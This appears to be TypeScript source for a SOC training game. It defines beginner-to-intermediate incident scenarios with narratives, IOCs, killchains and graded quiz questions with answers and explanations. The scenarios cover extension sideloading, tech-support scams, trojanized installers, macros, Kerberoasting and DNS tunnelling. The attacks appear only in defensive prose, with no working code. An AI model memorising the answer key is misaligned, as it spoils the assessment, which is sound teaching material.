    narrative: "d.cohen downloaded a 'perf boost' Chrome extension as a ZIP from a lure site, a NativeMessagingHosts key was registered under HKCU, and Chrome was relaunched with a developer-mode --load-extension flag. The extension messaged its registered native-messaging host — a cmd.exe wrapper Chrome launched — which spawned an encoded PowerShell command. That command connected to a newly registered domain and wrote b.ps1 to %TEMP%. The EDR killed the PowerShell process; the download URL, the registry registration, the file hashes and the C2 domain/IP tie the chain together end to end.",
    learning_objectives: [
      "Recognize a sideloaded browser extension as a persistence mechanism (T1176.001), separate from email or removable media",
      "Understand that an extension reaches the OS through a native-messaging host — the chrome.exe → cmd.exe → powershell.exe chain, not Chrome spawning PowerShell directly",
      "Identify a browser's native-messaging host spawning a scripting interpreter as a clear parent-child anomaly (T1059.001)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe",
      "See how EDR detection can lag behind execution — the beacon already completed before the process was killed",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-6 * MIN),        phase: "Initial Access",    action: "Chrome downloads the extension ZIP from a lure site" },
      { ts: T(-4 * MIN),        phase: "Persistence",       action: "A NativeMessagingHosts key is registered under HKCU for the host manifest" },
      { ts: T(0),               phase: "Persistence",       action: "Chrome relaunched with a sideloaded extension from Downloads" },
      { ts: T(MIN + 30_000),    phase: "Execution",         action: "chrome.exe launches the extension's native-messaging host (cmd.exe wrapper)" },
      { ts: T(2 * MIN),         phase: "Execution",         action: "The native host spawns encoded PowerShell — malware runs" },
      { ts: T(2 * MIN + 30_000), phase: "Command & Control", action: "PowerShell connects to a newly registered domain; URL filtering alerts but allows it" },
      { ts: T(2 * MIN + 45_000), phase: "Command & Control", action: "PowerShell writes b.ps1 to %TEMP%" },
      { ts: T(4 * MIN),         phase: "Detection",          action: "EDR kills the PowerShell process" },
    ],
    questions: [
      { id: "q1", prompt: "What is the clearest sign that this browser extension was not installed normally?", kind: "single",
        options: [
          { value: "flag",  label: "Chrome was launched with a --load-extension flag pointing to a folder in Downloads" },
          { value: "size",  label: "The extension folder was very small compared with typical Chrome Web Store extensions" },
          { value: "dept",  label: "d.cohen works in marketing, not IT, so has no reason to install browser extensions" },
        ],
        answer: "flag", xp: 40,
        explanation: "The --load-extension command-line flag is a developer-mode mechanism for loading unpacked extensions directly from disk — it bypasses the Chrome Web Store entirely, which is the normal install path for every legitimate extension. Folder size and the user's department are not reliable indicators on their own." },
      { id: "q2", prompt: "A Chrome extension cannot start a process by itself. How did this one reach powershell.exe, and why is that chain significant?", kind: "single",
        options: [
          { value: "yes", label: "The extension messaged its registered native-messaging host — a cmd.exe wrapper Chrome launched — which then spawned PowerShell; a browser's native host launching a script interpreter is an abnormal chain worth investigating" },
          { value: "no",  label: "The extension called powershell.exe directly through a JavaScript API, which is the normal way extensions run system tasks" },
        ],
        answer: "yes", xp: 50,
        explanation: "Browser extensions are sandboxed and cannot spawn arbitrary processes; the only supported bridge to the OS is Native Messaging, where Chrome launches a host executable registered on the machine. Here that host is a cmd.exe wrapper, which then spawned encoded PowerShell. The chrome.exe → cmd.exe → powershell.exe tree, not Chrome calling PowerShell directly, is the real signal and is abnormal on a user workstation." },
      { id: "q3", prompt: "The firewall ALLOWED the connection to cdn-assets-update.xyz. Does that mean the connection was safe?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the firewall evaluated the session against its URL and threat policy and allowed it, so it passed" },
          { value: "no",  label: "No — 'allowed' just means it wasn't on a blocklist yet; a domain the firewall categorises as newly registered is itself suspicious" },
        ],
        answer: "no", xp: 50,
        explanation: "Firewalls default to allow unless a domain is already known-bad. A newly registered domain is a strong red flag on its own, since legitimate business services are almost never that young. 'Allowed by the firewall' and 'safe' are not the same thing." },
    ],
  };
}

// =========================================================================
// Foundation Scenario D: Tech-Support Scam → Unapproved Remote Access Tool
// Fourth beginner-tier scenario — the user is socially engineered over the
// phone into installing a legitimate, signed remote-access tool themselves.
// One host, one user, EDR-only telemetry, no lateral movement, no
// credential theft — the "malware" here is abuse of a trusted tool.
// =========================================================================

export function buildTechSupportScamScenario(scenarioId = "tech-support-scam-2026"): ScenarioBundle {
  const { title, events, T, MIN, toolHash, scamSite, scamIp, relayHost, relayIp, peerId } = techSupportScamScenarioEvents();

  const iocs: IOC[] = [
    { type: "sha256", value: toolHash, reputation: "suspicious", tags: ["unapproved-remote-access-tool"] },
    { type: "domain", value: scamSite, reputation: "malicious", tags: ["tech-support-scam-page"] },
    { type: "ip",     value: scamIp,   reputation: "malicious", tags: ["tech-support-scam-page"] },
    { type: "domain", value: relayHost, reputation: "suspicious", tags: ["anydesk-relay"] },
    { type: "ip",     value: relayIp,  reputation: "suspicious", tags: ["anydesk-relay"] },
    // The caller's AnyDesk incoming ID (${peerId}) is evidence in the connection_trace row, not an IOC type the schema models.
  ];
  void peerId;

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Tech-Support Scam Operator (opportunistic, financially motivated)",
    attack_kind: "tech_support_scam_basic",
    briefing: "The EDR raised a behavioural alert for an unsanctioned remote-access tool on WS-ACC-4477 at 14:06 and terminated it. A scam page was loaded on the host earlier, and an AnyDesk relay session and a new service were logged in between. The user has not opened a ticket. Establish what ran and what the remote operator did.",
    narrative: "t.mizrahi loaded a scareware page (ms-support-alert.live), called the number on it, and was talked into downloading and running AnyDesk and granting the caller control. The AnyDesk connection_trace.txt records the incoming session ID and the operator's IP; during the live relay session cmd.exe ran systeminfo and netstat, and AnyDesk was installed as a service for unattended access. The EDR then raised a behavioural unsanctioned-RMM alert and killed the processes — the referrer URL, the relay host, the trace file and the service tie the chain together.",
    learning_objectives: [
      "Recognize that a legitimate, signed tool can still be the vehicle for an attack when used outside policy (T1219)",
      "Identify a remote-access tool spawning a command shell as an observable pivot point (T1059.003)",
      "Understand that social engineering over the phone is as real an initial-access vector as email or USB",
      "See that 'blocked' at the end does not undo whatever happened during the minutes the session was active",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-3 * MIN),         phase: "Preparation",   action: "Scam/scareware page loaded on WS-ACC-4477 (ms-support-alert.live)" },
      { ts: T(0),                phase: "Preparation",   action: "AnyDesk.exe downloaded to Downloads (referrer = the scam page)" },
      { ts: T(4 * MIN),          phase: "Initial Access", action: "t.mizrahi runs AnyDesk and grants control; relay session to an AnyDesk relay opens" },
      { ts: T(4 * MIN + 55_000), phase: "Initial Access", action: "AnyDesk trace file records the incoming session ID and the operator's IP" },
      { ts: T(4 * MIN + 90_000), phase: "Discovery",      action: "cmd.exe runs systeminfo and netstat during the live session" },
      { ts: T(5 * MIN + 40_000), phase: "Persistence",    action: "AnyDesk installed as a Windows service for unattended access" },
      { ts: T(6 * MIN),          phase: "Detection",      action: "EDR raises an unsanctioned-RMM behavioural alert and terminates the processes" },
    ],
    questions: [
      { id: "q1", prompt: "AnyDesk.exe is a legitimate, digitally signed application. Does that mean this event chain is not a security incident?", kind: "single",
        options: [
          { value: "yes", label: "Yes — AnyDesk is a signed, reputable vendor tool, so its presence on the host is an IT support matter and not a security incident at all" },
          { value: "no",  label: "No — remote-access tools are routinely abused in tech-support scams; how and why it was installed matters more than the signature" },
        ],
        answer: "no", xp: 40,
        explanation: "Attackers frequently use legitimate, signed software as their entry point specifically because it does not trigger traditional malware signatures. A signed binary is not automatically safe — it matters who installed it, why, and whether it is on the approved software list for that environment." },
      { id: "q2", prompt: "Which single detail here is the strongest indicator of a tech-support scam, as opposed to a normal IT remote session?", kind: "single",
        options: [
          { value: "cmd",  label: "AnyDesk — not the company's approved helpdesk tool — was installed with no prior history and immediately opened a live external relay session, during which the desktop ran enumeration commands" },
          { value: "size", label: "AnyDesk.exe is only about 4MB, much smaller than the enterprise remote-support client used by IT" },
          { value: "dept", label: "t.mizrahi works in accounting, a department with no approved use for remote-access tools" },
        ],
        answer: "cmd", xp: 50,
        explanation: "The company has a designated helpdesk tool for legitimate remote support. A personally-installed AnyDesk session with no prior history, an outbound connection to an AnyDesk relay, and system/network enumeration run on the desktop while that session is live together deviate sharply from the normal IT support process — that is the actual observable, not the file size or department. (AnyDesk itself has no remote-shell feature; the enumeration is the caller typing in the GUI session, so the shell's parent is explorer.exe, not AnyDesk.)" },
      { id: "q3", prompt: "The EDR shows 'action_result: blocked' with Critical severity. Is the incident fully resolved at that point?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the EDR blocked the process, which ends the remote session, so the threat is neutralized and the alert can be closed" },
          { value: "no",  label: "No — the remote session was active for several minutes before the block; the analyst must confirm what the caller did and document it" },
        ],
        answer: "no", xp: 60,
        explanation: "Killing the processes stops further access, but does not undo whatever the caller already saw or did during the active session — and the AnyDesk service installed for unattended access must be removed too. A SOC analyst still needs to review what commands were run, whether any data was viewed or copied, remove the service, and write up the incident for the user's awareness training." },
    ],
  };
}

// =========================================================================
// Foundation Scenario E: Cracked Software Installer → Scheduled Task Persistence
// Fifth beginner-tier scenario — infection vector is a trojanized installer
// from a sponsored search-ad result, distinct persistence mechanism
// (scheduled task, not registry Run key) from the USB scenario. One host,
// one user, EDR (+ one firewall event for the initial download).
// =========================================================================

export function buildCrackedSoftwareScenario(scenarioId = "cracked-software-installer-2026"): ScenarioBundle {
  const { title, events, T, MIN, downloadDomain, downloadIp, c2Domain, c2Ip, installerHash, payloadHash } = crackedSoftwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: downloadDomain, reputation: "suspicious", tags: ["cracked-software-host"] },
    { type: "ip",     value: downloadIp,     reputation: "suspicious", tags: ["cracked-software-host"] },
    { type: "domain", value: c2Domain,       reputation: "malicious", tags: ["external-infrastructure", "payload-c2"] },
    { type: "ip",     value: c2Ip,           reputation: "malicious", tags: ["external-infrastructure", "payload-c2"] },
    { type: "sha256", value: installerHash, reputation: "malicious", tags: ["trojanized-installer"] },
    { type: "sha256", value: payloadHash,   reputation: "malicious", tags: ["dropped-payload", "scheduled-task-persistence"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "cracked_software_installer_basic",
    briefing: "The firewall alerted on an executable download to WS-ENG-2093 at 20:10, Defender quarantined a file at 20:19, and in between a scheduled task was registered and the host connected to an unfamiliar domain. The activity is well outside business hours and y.golan has reported nothing.",
    narrative: "y.golan downloaded a trojanized Office 'activator' installer late in the evening (the firewall logged the EXE download; the browser saved it with its origin URL). Running it dropped svchelper.exe into C:\\ProgramData\\OfficeTools and registered a scheduled task (OfficeLicenseRefresh) that runs as y.golan — no admin, so no /ru SYSTEM. When the task fired, svchelper.exe ran and connected to a C2 domain before Defender quarantined it; the installer hash, the dropped-payload hash and the C2 domain/IP tie the chain together, and the task is not shown as removed.",
    learning_objectives: [
      "Recognize a trojanized installer served through a sponsored search-ad as an infection vector distinct from email or USB",
      "Identify user execution of an unsigned, never-before-seen binary (T1204.002)",
      "Understand Scheduled Task persistence (T1053.005) as a common alternative to a Registry Run key",
      "See that off-hours activity and unsigned binaries from user-writable paths are both independent, stackable red flags",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Initial Access", action: "Trojanized activator EXE downloaded from fast-office-tools-download.top" },
      { ts: T(6 * MIN),          phase: "Execution",      action: "y.golan runs the installer; it drops svchelper.exe to C:\\ProgramData\\OfficeTools" },
      { ts: T(6 * MIN + 40_000), phase: "Persistence",    action: "schtasks.exe registers OfficeLicenseRefresh (runs as y.golan) every 30 minutes" },
      { ts: T(7 * MIN + 30_000), phase: "Execution",      action: "The task fires — Task Scheduler launches svchelper.exe as y.golan" },
      { ts: T(7 * MIN + 45_000), phase: "Command & Control", action: "svchelper.exe connects to its C2 domain" },
      { ts: T(9 * MIN),          phase: "Detection",      action: "EDR quarantines the payload (the task itself is not shown removed)" },
    ],
    questions: [
      { id: "q1", prompt: "What made this download suspicious even before the installer was run?", kind: "single",
        options: [
          { value: "time", label: "It was downloaded at 20:10, off-hours, from a third-party 'activator' site instead of the official vendor" },
          { value: "size", label: "The installer was larger than 15MB, well above the size of the genuine vendor download" },
          { value: "dept", label: "y.golan works in engineering, not IT, and engineers should not be installing their own software" },
        ],
        answer: "time", xp: 40,
        explanation: "Off-hours activity combined with a download source that is not the software vendor's own site (a sponsored ad leading to a third-party 'activator' download) is a meaningful combination of red flags. File size and department alone are not reliable indicators." },
      { id: "q2", prompt: "How does this scenario's persistence mechanism differ from a Registry Run key?", kind: "single",
        options: [
          { value: "task", label: "A scheduled task relaunches the payload on a recurring interval and at logon, instead of a HKCU\\...\\Run registry value" },
          { value: "none", label: "There is no real difference — a scheduled task is just a Run key stored in a different hive and cleaned up the same way" },
        ],
        answer: "task", xp: 50,
        explanation: "Scheduled Task persistence (T1053.005) and Registry Run Key persistence (T1547.001) are both common but technically distinct techniques for surviving a reboot. Recognizing both is important because defenders and EDR products check different artifacts to detect and remove each one." },
      { id: "q3", prompt: "Microsoft Defender quarantined svchelper.exe and removed the scheduled task. Is the workstation fully clean at that point without further review?", kind: "single",
        options: [
          { value: "yes", label: "Yes — quarantining svchelper.exe reverses every change the payload made on the host, so no further review is needed" },
          { value: "no",  label: "No — the payload ran for several minutes before detection, and the detection does not show the OfficeLicenseRefresh task being deleted; the analyst must confirm the task is gone and check for other changes" },
        ],
        answer: "no", xp: 60,
        explanation: "Quarantining the payload stops the immediate threat, but the detection record does not confirm the scheduled task itself was removed — a task pointing at a now-missing binary will keep firing and erroring, and the attacker could re-drop the payload. A thorough analyst confirms the OfficeLicenseRefresh task is deleted and checks for other dropped files, modified settings, or additional persistence before closing the incident." },
    ],
  };
}

// =========================================================================
// Foundation Scenario F: Malicious Office Macro → PowerShell Execution
// Sixth beginner-tier scenario — a simpler cousin of the phishing-malware
// chain: a single macro-enabled attachment leads straight to WINWORD.EXE
// spawning PowerShell. No exfiltration, just the initial execution chain.
// =========================================================================

export function buildMaliciousMacroScenario(scenarioId = "malicious-macro-2026"): ScenarioBundle {
  const { title, events, T, MIN, c2Domain, c2Ip, docmHash, invHash } = maliciousMacroScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "newly-registered-domain"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "sha256", value: docmHash, reputation: "malicious", tags: ["macro-document", "email-attachment"] },
    { type: "sha256", value: invHash,  reputation: "malicious", tags: ["second-stage-download"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "malicious_macro_basic",
    briefing: "The EDR raised a high-severity 'Suspicious PowerShell command line' alert on WS-SALES-1876 (s.peretz) at 11:28. The mail gateway logged an inbound attachment to the same user a few minutes earlier, and the firewall shows a download from the host right after the alert.",
    narrative: "s.peretz received a phishing email with a macro-enabled Word attachment disguised as an invoice review request. It was delivered clean and only convicted later by ZAP. Enabling content caused WINWORD.EXE to spawn an encoded PowerShell command that downloaded inv.exe over HTTP from a newly registered domain into %TEMP%. The EDR quarantined inv.exe before it ran, then quarantined the document itself; the decoded command, the firewall file log and the file hashes tie every step together.",
    learning_objectives: [
      "Recognize a macro-enabled Office attachment as a delivery mechanism (T1566.001)",
      "Identify an Office application spawning PowerShell as the clearest sign of macro execution (T1059.001)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe",
      "See the simplest version of the macro-to-execution chain, without any data exfiltration stage",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Initial Access",    action: "Phishing email with macro-enabled attachment delivered to s.peretz" },
      { ts: T(8 * MIN),          phase: "Execution",         action: "s.peretz enables content — WINWORD.EXE spawns encoded PowerShell" },
      { ts: T(8 * MIN + 6_000),  phase: "Detection",         action: "EDR alert: Office application launched encoded PowerShell (detect-only)" },
      { ts: T(8 * MIN + 25_000), phase: "Command & Control", action: "PowerShell downloads inv.exe over HTTP from a newly registered domain; firewall allows it" },
      { ts: T(8 * MIN + 29_000), phase: "Detection",         action: "EDR quarantines inv.exe in %TEMP% before it runs" },
      { ts: T(11 * MIN),         phase: "Detection",         action: "EDR quarantines the .docm; ZAP pulls the message from the inbox a minute later" },
    ],
    questions: [
      { id: "q1", prompt: "What is the clearest technical sign that the Word document's macro did something dangerous?", kind: "single",
        options: [
          { value: "parent", label: "WINWORD.EXE appears as the parent process of powershell.exe" },
          { value: "size",   label: "The attachment was under 50KB, small for a real business document" },
          { value: "sender", label: "The email came from an external address outside the company domain" },
        ],
        answer: "parent", xp: 40,
        explanation: "Microsoft Word never legitimately needs to launch a scripting interpreter as a child process. Whenever WINWORD.EXE (or any Office app) appears as the parent of powershell.exe or cmd.exe, that parent-child relationship is the direct evidence of macro-driven execution — file size and sender domain are supporting context, not the direct proof." },
      { id: "q2", prompt: "Compared to a phishing email with a ZIP-wrapped executable attachment, what is different about this macro-based chain?", kind: "single",
        options: [
          { value: "exec", label: "The malicious code runs inside a trusted Office process (WINWORD.EXE), not as a standalone executable" },
          { value: "none", label: "Nothing meaningful — in both cases the user ends up running a standalone malicious executable file on disk" },
        ],
        answer: "exec", xp: 50,
        explanation: "A macro executes inside the Office application itself, so the very first malicious action (spawning PowerShell) comes from a process the user and many security tools already trust, rather than a newly-launched suspicious .exe. This is why macro-based delivery remains effective even in environments that block unusual attachment types." },
      { id: "q3", prompt: "At what point was WS-SALES-1876 actually compromised?", kind: "single",
        options: [
          { value: "email",   label: "When the phishing email with the .docm landed in the inbox" },
          { value: "execute", label: "When s.peretz enabled content and the macro ran PowerShell" },
          { value: "detect",  label: "When CrowdStrike raised its detection and killed the process" },
        ],
        answer: "execute", xp: 60,
        explanation: "Compromise happens at execution, not at delivery or at detection. The email sitting unopened is not a compromise, and the detection at the end is the response catching up to an infection that already happened minutes earlier." },
    ],
  };
}

// =========================================================================
// Scenario 7: Kerberoasting → Service Account Abuse → xp_cmdshell
// =========================================================================

export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): ScenarioBundle {
  const { title, events, T, MIN, attackerIp } = kerberoastingScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",   value: attackerIp,          reputation: "suspicious", tags: ["internal-attacker", "kerberoasting-source", "developer-workstation"] },
    { type: "ip",   value: "91.243.85.117",     reputation: "malicious",  tags: ["outbound-from-db-server", "post-xp_cmdshell"] },
    { type: "user", value: "m.cohen@nexacorp.com", reputation: "suspicious", tags: ["compromised-user", "kerberoasting-actor"] },
    { type: "user", value: "svc-mssql",           reputation: "suspicious", tags: ["compromised-svc-account", "cracked-via-kerberoast"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Internal Attacker (Compromised Developer Account)",
    attack_kind: "credential_theft_kerberoasting",
    briefing: "Microsoft Sentinel fired 'Anomalous Kerberos service ticket volume' for m.cohen on WS-DEV-4412 at 10:08, and Defender for Identity raised 'Suspected Kerberos SPN exposure' for the same account and workstation at 10:06. A related alert on srv-db01 is attached to the ticket.",
    narrative: `An attacker with a foothold on developer workstation WS-DEV-4412 used PowerView to enumerate all service principal names (SPNs) via LDAP. They then requested Kerberos TGS tickets for 12 service accounts in 90 seconds — all using weak RC4 encryption (0x17). These tickets were exfiltrated and cracked offline using hashcat. About eleven minutes later, the cracked svc-mssql password was used to log in interactively to the database server. From there, xp_cmdshell was used to execute a PowerShell reverse shell.`,
    learning_objectives: [
      "Identify RC4 encryption (0x17) in Event ID 4769 as a Kerberoasting indicator",
      "Recognize abnormal TGS request volume from a single account in a short window",
      "Correlate the identity alert (SPN exposure) → TGS requests (4769) → cracked service account login (4624)",
      "Understand why service accounts logging on interactively is highly suspicious",
      "Detect xp_cmdshell as a post-exploitation code execution technique (T1059.001)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),             phase: "Initial Access",     action: "Attacker foothold on developer workstation WS-DEV-4412" },
      { ts: T(2 * MIN),       phase: "Reconnaissance",     action: "SPN enumeration from WS-DEV-4412 — 12 service accounts with SPNs (seen through the identity sensor, not a DC event)" },
      { ts: T(4 * MIN),       phase: "Credential Access",  action: "Kerberos TGS tickets requested for SQL, IIS, Backup services (RC4/0x17)" },
      { ts: T(6 * MIN),       phase: "Detection",          action: "Defender for Identity: 'Suspected Kerberos SPN exposure' — m.cohen on WS-DEV-4412, 12 target accounts" },
      { ts: T(8 * MIN),       phase: "Detection",          action: "Sentinel: 'Anomalous Kerberos service ticket volume' — 12 RC4 TGS tickets in 90 seconds" },
      { ts: T(15 * MIN),      phase: "Credential Use",     action: "svc-mssql password cracked — interactive login to srv-db01" },
      { ts: T(18 * MIN),      phase: "Execution",          action: "xp_cmdshell spawns encoded PowerShell — attacker achieves code execution on DB server" },
      { ts: T(18 * MIN + 6_000), phase: "Command and Control", action: "srv-db01 opens outbound TCP/443 to 91.243.85.117 — block and hunt for the address" },
    ],
    questions: [
      {
        id: "kerb_q1_rc4",
        prompt: "Event evt_kerb_03_tgs_sql is a 4769 service-ticket request whose TicketEncryptionType is 0x17. Why does that single value turn a routine Kerberos event into a Kerberoasting indicator?",
        kind: "single",
        options: [
          { value: "rc4_offline_crack", label: "An RC4 ticket is encrypted with the service account's NTLM hash, so it cracks offline" },
          { value: "dc_fallback", label: "0x17 means the DC rejected the stronger AES cipher and issued a downgraded ticket instead" },
          { value: "preauth_disabled", label: "0x17 marks the target account as having Kerberos pre-authentication switched off" },
          { value: "tgt_only_value", label: "0x17 can only ever appear on a TGT request, never on a service-ticket request" },
        ],
        answer: "rc4_offline_crack",
        xp: 50,
        explanation:
          "0x17 is RC4-HMAC. The TGS is sealed with a key derived directly from the service account's NTLM hash, so anyone holding the ticket can brute-force the password offline with no further traffic to the DC — that is the whole point of Kerberoasting (T1558.003). 'dc_fallback' is wrong: the client, not the DC, proposes the encryption types, and RC4 here was requested, not forced. 'preauth_disabled' describes AS-REP roasting (T1558.004), which shows up as PreAuthType 0 on a 4768 TGT request, not as an encryption type on a 4769. 'tgt_only_value' inverts the facts — the record is event ID 4769, a TGS, and TicketEncryptionType appears on both 4768 and 4769.",
      },
      {
        id: "kerb_q2_volume",
        prompt: "Select the TWO observations that, taken together, separate this activity from normal Kerberos ticket traffic. You will need evt_kerb_02_mdi_spn_exposure and evt_kerb_06_ticket_spike.",
        kind: "multi",
        options: [
          { value: "spn_enum_first", label: "The identity sensor ties the requests to one account working through 12 SPN-holding service accounts" },
          { value: "twelve_in_90s", label: "Twelve service tickets for twelve distinct SPNs were issued inside a 90-second window" },
          { value: "logged_on_dc", label: "Every one of the ticket requests was recorded on DC01 rather than on the workstation" },
          { value: "ntlm_package", label: "The ticket requests name NTLM as the authentication package used against the domain" },
        ],
        answer: ["spn_enum_first", "twelve_in_90s"],
        xp: 75,
        explanation:
          "Kerberoasting has a shape: first find every account that has an SPN, then ask for a ticket for each one. Defender for Identity's 'Suspected Kerberos SPN exposure' names that shape — one source account and workstation, 12 SPN-holding target accounts — and the Sentinel rule measures it: 12 RC4 tickets for 12 distinct services in 90 seconds. A single ticket request is ordinary; one user sweeping every service account is the technique. (A domain controller writes no Security event for a client's LDAP search filter, so the enumeration itself is seen through the identity sensor, not a 4662.) 'logged_on_dc' is a property of the log source, not the behaviour: 4769 is *always* written by the KDC on a domain controller, including for m.cohen's benign baseline ticket. 'ntlm_package' is simply false here — 4769 is a Kerberos event by definition and no NTLM package is recorded on it; the NTLM authentication in this scenario appears later, on the 4624s.",
      },
      {
        id: "kerb_q3_chain",
        prompt: "evt_kerb_07_svcacct_login shows svc-mssql logging on to srv-db01 with LogonType 10, sourced from WS-DEV-4412 and using the NTLM package. Read alongside evt_kerb_03_tgs_sql. What does the pair actually establish?",
        kind: "single",
        options: [
          { value: "cracked_and_reused", label: "The svc-mssql ticket was cracked offline and its recovered password used to log on" },
          { value: "ticket_replayed", label: "The captured TGS ticket was replayed straight to srv-db01 to open the interactive session" },
          { value: "service_restart", label: "The SQL Server service restarted on srv-db01 and re-authenticated its own account" },
          { value: "delegation_relay", label: "Unconstrained delegation on srv-db01 forwarded m.cohen's ticket on to the database host" },
        ],
        answer: "cracked_and_reused",
        xp: 100,
        explanation:
          "The link is the eleven-minute gap plus the authentication package. A TGS is Kerberos; this logon is NTLM, which means a password or its hash was typed in, not a ticket presented — so the ticket must have been cracked in between. 'ticket_replayed' fails on that same field: replaying a TGS produces a Kerberos logon, and a service ticket grants access to one service, not an interactive session. 'service_restart' fails on LogonType and origin — a service starting itself is LogonType 5 and originates on srv-db01, whereas this record carries the developer workstation's IP. 'delegation_relay' would impersonate m.cohen, the delegating user, and would still be Kerberos; the TargetUserName here is svc-mssql.",
      },
      {
        id: "kerb_q4_dbexec",
        prompt: "Select the TWO facts that make the srv-db01 activity a confirmed compromise rather than ordinary database administration.",
        kind: "multi",
        options: [
          { value: "svc_interactive", label: "A service account opened an interactive session from a developer's workstation" },
          { value: "xp_cmdshell_enc", label: "sqlservr.exe used xp_cmdshell to launch a hidden Base64-encoded PowerShell command" },
          { value: "master_database", label: "The Guardium record shows the statement was executed against the master database" },
          { value: "osql_client", label: "The client application on the Guardium record is osql.exe rather than a web app" },
        ],
        answer: ["svc_interactive", "xp_cmdshell_enc"],
        xp: 75,
        explanation:
          "Service accounts are meant to be used *by services* — non-interactive logon types from the servers they run on. A LogonType 10 for svc-mssql sourced from a developer workstation has no benign explanation, and xp_cmdshell spawning hidden encoded PowerShell is command execution on the DB host (T1059.001), not database work. 'master_database' is a red herring: xp_cmdshell is an extended stored procedure that lives in master, so every legitimate call to it is also against master. 'osql_client' is likewise neutral — osql.exe is a Microsoft-supplied SQL client that DBAs use daily; the tool does not make the statement malicious, the statement does.",
      },
    ],
  };
}

// =========================================================================
// Scenario 8: DNS Tunneling — C2 via DNS TXT Records + Exfiltration
// =========================================================================

export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): ScenarioBundle {
  const { title, events, T, MIN, victimIp, c2Domain, dnscat2Hash } = dnsTunnelingScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain,                       reputation: "malicious", tags: ["c2-domain", "dns-tunnel", "dnscat2", "newly-registered"] },
    { type: "sha256", value: dnscat2Hash,                    reputation: "malicious", tags: ["dnscat2-client", "dns-tunnel-implant"] },
    { type: "ip",     value: victimIp,                       reputation: "suspicious", tags: ["infected-host", "dns-tunnel-source"] },
    { type: "domain", value: `data.${c2Domain}`,             reputation: "malicious", tags: ["c2-exfil-subdomain", "dns-chunked-exfil"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-TUNNELRAT (Nation-State Affiliate)",
    attack_kind: "c2_dns_tunneling",
    briefing: "Microsoft Sentinel fired a DNS query-volume anomaly on WS-ENG-3301 at 14:06 — the host is far above its own baseline. Defender for Endpoint has attached a process name to the traffic, and the firewall logged port 53 traffic to an unfamiliar domain.",
    narrative: `An attacker who had established initial access delivered dnscat2 via an encoded PowerShell command. The tool opened a covert C2 channel using DNS queries — encoding all communication as base32 subdomain names to the attacker-controlled domain nexus-update-svc.xyz. Commands were received via DNS TXT record responses. After recon commands, the attacker began exfiltrating sensitive data by encoding it into sequential DNS subdomain names, chunking a 29 KB file over 247 queries in 4 minutes — each label is capped at 63 bytes and the whole query name at 255, so packing several labels into one name carries only about 120 bytes of decoded data per query.`,
    learning_objectives: [
      "Recognize DNS tunneling indicators: high-entropy subdomains, long subdomain names, TXT record C2",
      "Understand why volume (847 queries/min vs. baseline 23) is a key detection signal",
      "Correlate PowerShell download → DNS volume spike → TXT record commands → data exfiltration chunks",
      "Identify how base32/base64 encoding is used to hide data in DNS labels",
      "Know what dnscat2 traffic looks like in DNS logs (Event ID 22 + Sysmon)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),        phase: "Initial Access",   action: "Encoded PowerShell downloads and executes dnscat2 (update.exe)" },
      { ts: T(3 * MIN),  phase: "C2 Establishment", action: "DNS tunnel initiated — base32 encoded subdomains to nexus-update-svc.xyz" },
      { ts: T(6 * MIN),  phase: "C2 Active",        action: "847 DNS queries in 60 seconds — tunnel established and active" },
      { ts: T(10 * MIN), phase: "Command & Control", action: "C2 commands delivered via DNS TXT records (encoded: whoami /all, net user)" },
      { ts: T(14 * MIN), phase: "Exfiltration",     action: "Credential data encoded in DNS subdomain names — slow exfil begins" },
      { ts: T(18 * MIN), phase: "Exfiltration",     action: "247 sequential chunk queries — 29 KB file exfiltrated over DNS" },
    ],
    questions: [
      {
        id: "dns_q1_indicators",
        prompt: "The Sysmon Event ID 22 records from WS-ENG-3301 are the primary evidence. Which combination of fields inside those records is the tunnelling indicator?",
        kind: "single",
        options: [
          { value: "long_label_plus_txt", label: "53-character encoded labels and TXT lookups, all from one image in C:\\Windows\\Temp" },
          { value: "nxdomain_responses", label: "NXDOMAIN was returned for every name the workstation asked the resolver to look up" },
          { value: "udp_port_53", label: "The lookups travelled over UDP port 53 to the internal corporate resolver on 10.10.1.1" },
          { value: "aaaa_alongside_a", label: "AAAA record lookups were issued alongside the ordinary A record lookups by the host" },
        ],
        answer: "long_label_plus_txt",
        xp: 50,
        explanation:
          "Sysmon 22 gives you QueryName, QueryResults and — critically — Image. A 53-character random-looking label, TXT lookups, and an image path of C:\\Windows\\Temp\\update.exe are three independent oddities in one record. 'nxdomain_responses' is not what the logs show: QueryStatus is 0 and answers came back, and in any case a burst of NXDOMAIN is routine (search-suffix expansion, typos). 'udp_port_53' describes every DNS query on the network including the benign baseline, so it discriminates nothing. 'aaaa_alongside_a' is normal dual-stack behaviour — the baseline event itself lists A and AAAA as this host's query types.",
      },
      {
        id: "dns_q2_volume",
